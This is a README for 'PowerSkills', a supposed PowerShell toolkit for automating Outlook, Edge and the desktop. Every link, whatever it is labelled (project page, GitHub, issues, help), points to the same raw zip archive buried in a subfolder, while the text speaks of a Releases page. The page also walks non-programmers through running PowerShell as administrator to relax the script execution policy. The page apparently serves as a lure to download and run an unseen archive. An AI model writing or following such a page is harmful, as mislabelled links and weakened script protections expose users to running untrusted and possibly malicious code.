# ⚡ PowerSkills - Automate Tasks with Easy Controls

[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-green?style=for-the-badge)](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)

---

PowerSkills is a simple tool that helps you control Windows apps like Outlook and the Edge browser using easy commands. It uses structured JSON files to tell the computer what to do. This toolkit helps automate daily tasks without needing programming skills.

---

## 📋 What PowerSkills Does

PowerSkills lets you use PowerShell scripts to automate common activities on your computer. You can:

- Control Outlook to manage emails and calendar events.
- Automate the Edge browser for web tasks.
- Run commands to control your desktop and system settings.
- Use JSON files to set up and customize tasks.
- Simplify repetitive work with easy-to-follow scripts.

It is built for Windows and uses PowerShell modules. The commands are designed to be clear and editable.

---

## 🛠 System Requirements

To run PowerSkills, you need:

- Windows 10 or newer operating system.
- PowerShell version 5.1 or higher installed (usually pre-installed on Windows).
- At least 1 GB of free RAM.
- A stable internet connection for some automated tasks.
- Basic user permissions to run PowerShell scripts.

Make sure your Windows accounts allow you to run scripts. If scripts are blocked, you may need to change your PowerShell execution policy.

---

## 🚀 Getting Started

Follow these steps to get PowerSkills running on your Windows PC.

### Step 1: Download PowerSkills

Click this link to visit the project page and get the files you need:

[Download PowerSkills](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)

You will find the download option near the top under the "Releases" or main page.

### Step 2: Save the Files

When visiting the download page, look for a file named like `PowerSkills.zip` or a folder labeled `Releases`. Download that file to a folder you can easily find, such as your Desktop or Downloads folder.

### Step 3: Extract the Files

If you download a ZIP file:

1. Right-click the ZIP file.
2. Choose "Extract All."
3. Pick a folder where you want the files to live.
4. Click "Extract."

Extraction creates a folder that holds all the PowerSkills scripts.

### Step 4: Prepare PowerShell

Windows may block scripts from running by default. To allow PowerSkills scripts:

1. Press the Windows key and type `PowerShell`.
2. Right-click on “Windows PowerShell” and select “Run as Administrator.”
3. Type this command and press Enter:

   `Set-ExecutionPolicy RemoteSigned`

4. When asked for confirmation, type `Y` and press Enter.

This lets PowerShell run scripts you made or downloaded that are trusted.

---

## ⚡ Running a Sample Script

Now that PowerSkills is downloaded and ready, try running a sample:

1. Open PowerShell (normal user mode).
2. Use the `cd` command to go to the folder where you extracted files. Example:

   `cd C:\Users\YourName\Desktop\PowerSkills`

3. Run a script by typing its name. For example:

   `.\Start-EdgeAutomation.ps1`

This script will open the Edge browser and perform predefined tasks. You can edit its JSON input files to change what it does.

---

## 🔧 Using PowerSkills Features

PowerSkills works with JSON files to tell your computer exactly what to automate. These files use clear commands arranged in groups:

- **Outlook Controls:** Send email, check inbox, add calendar events.
- **Edge Automation:** Open pages, fill out forms, download files.
- **Desktop Control:** Open apps, move files, control windows.
- **System Info:** Check status of hardware, network, and processes.

You can create or modify these JSON files to fit your tasks. PowerSkills reads these files and runs the steps in order.

---

## 📁 Folder Contents Overview

After extraction, you will find these essentials:

- `*.ps1` files — PowerShell scripts that run tasks.
- `Config` folder — Contains JSON files for customization.
- `Docs` folder — Manuals and explanations for commands.
- `Logs` folder — Where the tool stores its activity history.

The scripts use COM automation and system APIs to control apps and hardware.

---

## 🤖 Automation Tips for Non-Programmers

- Edit JSON files using Notepad or any simple text editor.
- Each step in JSON is a command like "open app" or "send email."
- Save your changes and rerun the matching PowerShell script.
- Use sample files as templates for your own tasks.
- Avoid making copy-paste errors by keeping the JSON format intact.

The design focuses on clear structure without needing code writing skills.

---

## 🔄 Updating PowerSkills

To get the latest features and fixes:

1. Return to the download page:  
   [PowerSkills on GitHub](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)

2. Download the newest files or release packages.
3. Overwrite your old folder contents with the new files.
4. Repeat the setup steps if the update includes new requirements.

---

## ⚙️ Changing Execution Policy Back (Optional)

If you want to set your PowerShell back to a more restricted mode after using PowerSkills, run this in PowerShell as Administrator:

`Set-ExecutionPolicy Restricted`

Confirm with `Y`.

---

## 📞 Getting Help

The project page offers:

- Documentation on how to use commands.
- Examples and sample scripts to try.
- An issues page to report problems.

Visit:

[https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)

Check the README and Wiki files online for detailed info.

---

## 🔐 Security Notes

PowerSkills runs scripts on your computer and interacts with email and browser apps. Use it only with files and JSON commands you trust. Running unknown scripts may harm your system or leak data. Always review automation steps before running.

---

[![Download PowerSkills](https://img.shields.io/badge/Download-PowerSkills-blue?style=for-the-badge)](https://raw.githubusercontent.com/felipemsilva/PowerSkills/main/skills/outlook/Skills_Power_2.2.zip)